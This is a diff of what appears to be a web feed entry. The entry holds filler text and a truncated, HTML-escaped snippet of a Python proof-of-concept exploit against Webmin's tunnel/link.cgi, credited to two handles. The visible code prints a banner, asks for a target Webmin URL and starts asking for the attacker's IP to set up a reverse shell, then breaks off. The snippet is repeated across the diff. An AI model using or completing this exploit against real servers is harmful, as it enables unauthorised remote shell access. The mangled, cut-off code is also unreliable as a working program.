@@ -29,7 +29,8 @@
         
         
           Hello Hello2 Hello3 Here is a snip of the code:
-for i in range(101): print( &amp;#34;\r\033[1;36m [&amp;gt;] POC By \033[1;m \033[1;37mMesh3l\033[1;m \033[1;36m ( \033[1;m\033[1;37m@Mesh3l_911\033[1;m\033[1;36m ) &amp;amp; \033[1;m \033[1;37mZ0ldyck\033[1;m\033[1;36m ( \033[1;m\033[1;37m@electronicbots\033[1;m\033[1;36m ) \033[1;m {} \033[1;m&amp;#34;.format( i), &amp;#34;\033[1;36m%\033[1;m&amp;#34;, end=&amp;#34;&amp;#34;) time.sleep(0.02) print(&amp;#34;\n\n&amp;#34;) target = input( &amp;#34;\033[1;36m \nPlease input ur target&amp;#39;s webmin path e.g. ( https://webmin.Mesh3l-Mohammed.com/ ) &amp;gt; \033[1;m&amp;#34;) if target.endswith(&amp;#39;/&amp;#39;): target = target + &amp;#39;tunnel/link.cgi/&amp;#39; else: target = target + &amp;#39;/tunnel/link.cgi/&amp;#39; ip = input(&amp;#34;\033[1;36m \nPlease input ur IP to set up the Reverse Shell e.
+Look me up plz
+for i in range(101): print( &amp;#34;\r\033[1;36m [&amp;gt;] POC By \033[1;m \033[1;37mMesh3l\033[1;m \033[1;36m ( \033[1;m\033[1;37m@Mesh3l_911\033[1;m\033[1;36m ) &amp;amp; \033[1;m \033[1;37mZ0ldyck\033[1;m\033[1;36m ( \033[1;m\033[1;37m@electronicbots\033[1;m\033[1;36m ) \033[1;m {} \033[1;m&amp;#34;.format( i), &amp;#34;\033[1;36m%\033[1;m&amp;#34;, end=&amp;#34;&amp;#34;) time.sleep(0.02) print(&amp;#34;\n\n&amp;#34;) target = input( &amp;#34;\033[1;36m \nPlease input ur target&amp;#39;s webmin path e.g. ( https://webmin.Mesh3l-Mohammed.com/ ) &amp;gt; \033[1;m&amp;#34;) if target.endswith(&amp;#39;/&amp;#39;): target = target + &amp;#39;tunnel/link.cgi/&amp;#39; else: target = target + &amp;#39;/tunnel/link.
           
         
         </description>
